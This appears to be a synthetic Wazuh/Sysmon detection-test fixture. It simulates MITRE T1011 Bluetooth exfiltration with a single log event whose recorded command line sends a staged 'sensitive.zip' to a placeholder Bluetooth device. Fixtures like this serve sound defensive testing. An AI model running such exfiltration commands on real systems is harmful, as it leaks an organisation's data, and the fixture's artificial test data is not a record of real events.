@@ -1,0 +1,91 @@
+{
+  "_metadata": {
+    "attack_id": "T1011",
+    "variation": "001",
+    "name": "Exfiltration Over Other Network Medium - Bluetooth",
+    "description": "Data exfiltration using Bluetooth to bypass network monitoring",
+    "expected_detection": "LOW",
+    "kill_chain_phase": "exfiltration",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - Bluetooth send tool execution",
+      "sequence": 1,
+      "timestamp": "2026-02-10T18:02:00.000Z",
+      "log": {
+        "timestamp": "2026-02-10T18:02:00.000+0000",
+        "rule": {
+          "level": 10,
+          "description": "Sysmon - Event 1: Bluetooth Exfiltration Tool",
+          "id": "100603",
+          "mitre": {
+            "id": [
+              "T1011"
+            ],
+            "tactic": [
+              "Exfiltration"
+            ],
+            "technique": [
+              "Exfiltration Over Other Network Medium"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707588120.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-10 18:02:00.000",
+              "processGuid": "{8df8f34e-2810-65c7-0032-000000000400}",
+              "processId": "9024",
+              "image": "C:\\Tools\\bluetooth-sendto.exe",
+              "commandLine": "bluetooth-sendto.exe --device=AA:BB:CC:DD:EE:FF --file=C:\\staging\\sensitive.zip",
+              "currentDirectory": "C:\\Tools\\",
+              "user": "CORP\\admin2",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=B2C3D4E5F67890123456789012345678901BCDEF123456789012BCDEF1234567",
+              "parentProcessGuid": "{8df8f34e-2810-65c7-0000-000000000400}",
+              "parentProcessId": "4456",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "fomorian_batch": 9,
+        "fomorian_campaign": 28,
+        "fomorian_technique": "T1011",
+        "fomorian_technique_name": "Exfiltration Over Other Network Medium - Bluetooth"
+      }
+    }
+  ]
+}
